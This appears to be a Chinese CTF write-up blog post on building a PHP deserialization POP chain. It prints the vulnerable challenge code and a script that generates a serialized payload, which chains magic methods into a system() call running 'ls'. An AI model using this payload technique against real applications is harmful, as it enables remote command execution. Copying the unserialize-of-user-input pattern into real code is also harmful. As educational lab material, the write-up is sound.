---

title: php反序列化——pop链

date: 2021-03-24 22:43:12

tags: 练习

categories: test54

---
这星期实验室有一道php反序列化的题目，主要考察了一些魔法函数的调用和对pop链的构造，正好前几次比赛也是经常考察了这一知识点，所以特意做了几道php反序列化的题目，来真正学习一下这个重要的知识点。  

# ppppp  
打开题目，看到代码：  

	<?php
	error_reporting(0);
	highlight_file(__FILE__);
	class A
	{
    public $A1;
    public $A2;
    public function __call($name,$param)
    {
        if($this->{$name})
            {
                $A3 = $this->{$name};
                $A3();
            }
    }
    public function __get($wuhu)
    {
        return $this->A2[$wuhu];
    }
	}


	class B
	{
    public $B1;
    public $B2;
    public function __destruct()
    {
        $this->B1->godmi();
    }
	} 

	class C
	{
    public $C1;
    public $C2;
    public $C3;
    public function __invoke()
    {
        $this->C2 = $this->C3.$this->C1;
    } 
	}

	class D
	{
    public $D1;
        
    public function FLAG()
    {
        system($this->D1);
    }
	}
	class E
	{
    public $E1;
    public $E2;
    public function __toString()
    {
        $this->E1->{$this->E2}();
        return "1";
    }
	}
	$ppppp = $_POST['Troy3e'];
	unserialize($ppppp);
	?>  

代码挺长的，但是并不难理解，简单的代码审计一下可以看到这道题目不像我们之前做过的只有一个类，然后直接反序列化得到结果那样了。而是有不少类共同组成的，也就是说，如果我们想要得到最后结果，就要考虑到这些类的练习，这时候就需要构造pop链了。  

简单的说pop链就是在反序列化中利用一些函数或者变量的设计漏洞，然后将这些漏洞串联起来，形成一条链，最后达到控制我们可以控制的参数来进行rec等操作。  

那么我们就先来看一下代码中什么变量参数是我们想要控制的。可以看到，在D类中，有一个命令执行函数system($this->D1)。这个所以说这个D1就是我们要控制输入的参数了。  

我们可以进一步看到这个D类中有一个FLAG()函数，而我们要想调用这个函数，就必须要使用E类中的__toString() 方法。  

	__toString方法，当前对象访问str再访问source，然后返回这个值，就是把类当作字符串使用时触发  

而关于E类的代码如下：  

	class E
	{
    public $E1;
    public $E2;
    public function __toString()
    {
        $this->E1->{$this->E2}();
        return "1";
    }
	} 

也就是说，我们将E类当作字符串使用，然后给E2赋值为FLAG，这样它最后输出的就是FLAG(),从而就可以执行D中的函数，那么我们如何触发E类的__toString() 方法呢？  

可以看到在C类中有这样一串代码  

	public function __invoke()
    {
        $this->C2 = $this->C3.$this->C1;
    }  

这里的$this->C3.$this->C1;是将C3和C1当作字符串连接起来，那么我们就可以利用这里来让E类被当作字符串，从而输出我们的FLAG()。  

那么问题又来了，可以看到这传代码是在__invoke()方法里的，那我们要如何触发这个方法呢？  

	__invoke()魔术方法：在类的对象被调用为函数时候，自动被调用  

也就是说当我们这样调用**E(“这里是参数，可以不填”)**，也就是将E类当作函数使用的时候，这个方法就可以触发，那么接下来就是找一下哪里可以实现吧E类转化成函数形式了。  

可以看到A类代码中有这样的代码  

	public function __call($name,$param)
    {
        if($this->{$name})
            {
                $A3 = $this->{$name};
                $A3();
            }
    }   
	    public function __get($wuhu)
    {
        return $this->A2[$wuhu];
    }

可以看到A3后面加上了一个括号，使A3变成了函数形式，所以说我们如果可以让A3=E类，那么就能成功。如何做到这一点呢，可以看到A类中有两个魔术函数  

	__get()魔术方法：从不可访问的属性中读取数据会触发  
	__call():在对象中调用一个不可访问方法时，__call() 会被调用。  

可以看到如果我们调用了一个不存在的函数就能触发_call()方法，而这个方法括号中有两个参数反别是不存在的方法名称和方法参数，例如：  

调用不存在函数test(123),那么_call($name,$param)中的$name=test，$param=123。  

那么接下来就是让A3赋值为E类，这就要用到_get()方法了。当我们访问一个不可访问的属性的时候（**不存在的属性也是不可访问的哦**），就会调用这个函数，而get()里的参数就是接受那个属性，而可以看到当get()方法接受了那个不可访问的属性后，会将这个属性重新赋值然后再返回给$name,最后赋值给A3，形成函数形式，那么我们不就可以控制我们输入的的值并且使它等于E类了吗？  

那么就来到最后一步了，我们如何触发这个A类里的函数呢？可以看到B类里的函数  

	class B
	{
    public $B1;
    public $B2;
    public function __destruct()
    {
        $this->B1->godmi();
    }
	}    

__destruct()这个方法是老熟客了。当我们摧毁一个属性的值的时候就会调用这个函数，而当我们改变一个属性的值的时候也会触发，我们可以看到，这个方法如果触发，那么他就会给B1赋值为一个godmi()函数，这个函数正好可以触发A类里的call()方法和get()方法（**因为我们要访问的是A类里的godmi()属性，而这个是A类中所没有的**），这不就是我们想要的吗。而这个B1变量完全可以控制，这就满足了我们构造pop链的条件。  

那么我们来整理一下大致的pop链吧。  

	B()->B1=A()
	A()->A2=C()
	C()->C3=E(),C1="一串字符串"(只有C1,C3都是字符串才能进行连接)
	E()->E1=D()，E2="FLAG"
	D()->D1=要执行的命令；  

然后就是代码打印出序列化后的pop链：  

	<?php
	class A
	{
	    public $A1;
	    public $A2;
	    public function __construct()
	    {
	     $this->A2['godmi']=new C();
	    }
	} 
	class B
	{
	    public $B1;
	    public $B2;
	    public function __construct()
	    {
	        $this->B1=new A();
	    }
	} 
	class C
	{
	    public $C1;
	    public $C2;
	    public $C3;
	    public function __construct()
	    {
	        $this->C1=new E();
	        $this->C3='www';
	    } 
	}
	class D
	{
	    public $D1;
	        
	    public function __construct()
	    {
	        $this->D1="ls";
	    }
	}
	class E
	{
	    public $E1;
	    public $E2;
	    public function __construct()
	    {
	        $this->E1=new D();
	        $this->E2='FLAG';
	    }
	} 
	$b=new B();
	$x=serialize($b);
	echo $x;
	?>  

得到序列化后的字符串  

	O:1:"B":2:{s:2:"B1";O:1:"A":2:{s:2:"A1";N;s:2:"A2";a:1:{s:5:"godmi";O:1:"C":3:{s:2:"C1";O:1:"E":2:{s:2:"E1";O:1:"D":1:{s:2:"D1";s:2:"ls";}s:2:"E2";s:4:"FLAG";}s:2:"C2";N;s:2:"C3";s:3:"www";}}}s:2:"B2";N;}  

然后通过命令查看flag文件就行了。  

# 小结  

关于pop链的考察其实还是考察的代码审计能力，要能从代码中找到可以利用的函数或者参数，通过一步步的倒推或者正推来完善一条pop链，最后编写代码打印出pop链。在这中题目中重点就是对于魔术函数的理解和运用，这种题还是要多做，以后的比赛中一般不会再出现之前那样简单的反序列化题目了。
